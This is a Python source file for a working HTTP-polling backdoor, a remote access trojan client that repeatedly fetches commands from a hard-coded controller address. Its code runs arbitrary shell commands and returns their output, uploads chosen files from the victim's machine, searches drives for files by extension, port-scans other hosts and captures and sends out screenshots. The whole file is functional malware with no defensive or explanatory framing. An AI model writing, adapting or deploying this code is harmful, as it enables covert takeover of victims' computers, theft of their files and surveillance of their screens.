import requests
import subprocess
import time
import os
from PIL import ImageGrab
import tempfile
import socket
import shutil

URL = 'http://192.168.0.104:8080'



def scanner(ip,ports):
	scan_result = ''
	for port in ports.split(','):
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			output = sock.connect_ex((ip, int(port) ))
			if output == 0:
				scan_result = scan_result + "[+] Port " +port+ " is opened" +'\n'
			else:
				scan_result = scan_result + "[-] Port " +port+" is closed or Host is not reachable" +'\n'
			sock.close()
		except Exception as e:
			print(e)
	post_response = requests.post(url = URL,data = scan_result )


def fileTransfer(path):
	if os.path.exists(path):
			url = "http://192.168.0.104:8080/store"
			files = {'file':open(path,'rb')}
			r = requests.post(url,files = files)
			files['file'].close()
	else:
		post_response = requests.post(url="http://192.168.0.104:8080/",data = '[-] Not able to find file')


while True:
	req = requests.get('http://192.168.0.104:8080')
	command = req.text

	if 'terminate' in command:
		break

	elif 'cd' in command: # the forumal here is gonna be cd then space then the path that we want to go to, like  cd C:\Users
            code,directory = command.split ('*') # split up the reiceved command based on space into two variables
            os.chdir(directory) # changing the directory 
            #s.send( "[+] CWD Is " + os.getcwd() ) # we send back a string mentioning the new CWD
            post_response = requests.post(url = URL,data = os.getcwd() )
            #post_response = requests.post(url = URL,data = os.getcwd() )
            time.sleep(3)
            

	elif 'grab' in command:
		grab,path = command.split('*')
		fileTransfer(path)

		'''
		if os.path.exists(path):
			url = "http://192.168.0.103:8080/store"
			files = {'file':open(path,'rb')}
			r = requests.post(url,files = files)
		else:
			post_response = requests.post(url="http://192.168.0.103:8080/",data = '[-] Not able to find file')
		'''

	elif 'scan' in command:
	 	command = command[5:]
	 	ip,ports = command.split(':')
	 	scanner(ip,ports)

	elif 'search' in command:
		command = command[7:]
		path,ext=command.split('*')
		list = ''
		for dirpath, dirname, files in os.walk(path):
			for file in files:
				if file.endswith(ext):
					list = list + '\n' + os.path.join(dirpath, file)

		requests.post(url=URL, data= list )  # Send the search result
        

	elif 'screencap' in command:
		dirpath = tempfile.mkdtemp()
		imagePath = dirpath+"\\img.jpg"
		ImageGrab.grab().save(imagePath,"JPEG")
		fileTransfer(imagePath)
		shutil.rmtree(dirpath)

	else:
		CMD = subprocess.Popen(command,shell = True,stdin = subprocess.PIPE,stdout = subprocess.PIPE,stderr = subprocess.PIPE)
		post_response = requests.post(url = URL,data = CMD.stdout.read())
		post_response = requests.post(url = URL,data = CMD.stderr.read())
		time.sleep(3)
